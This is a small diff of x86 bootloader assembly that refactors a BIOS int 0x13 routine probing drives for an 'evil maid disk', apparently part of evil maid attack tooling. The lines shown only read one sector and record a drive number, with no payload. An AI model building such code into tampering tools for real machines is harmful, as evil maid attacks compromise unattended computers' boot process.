@@ -49,9 +49,8 @@ sleep:
 ; value to identify the evil maid disk. Stores dl in [disknum] if
 ; it finds the disk (so, if [disknum] is still 0x99, we didn't find it)
 find_disk:
-  mov ah, 0x02 ; I want to read
+  mov ax, 0x201 ; I want to read, and I only want one sector
   mov dh, 0x00 ; zeroeth head
-  mov al, 0x01 ; I want to read one sector
   mov cx, 0x01 ; first sector, zero-eth track
   int 0x13
   jc find_disk_end ; carry bit is set on read error
